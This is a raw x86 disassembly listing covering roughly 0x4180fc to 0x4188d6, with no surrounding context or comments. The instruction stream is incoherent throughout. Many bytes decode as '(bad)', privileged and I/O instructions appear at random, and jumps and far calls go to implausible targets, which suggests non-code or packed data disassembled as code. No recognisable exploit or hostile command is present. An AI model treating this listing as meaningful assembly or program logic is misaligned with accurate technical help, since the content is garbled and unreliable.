  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
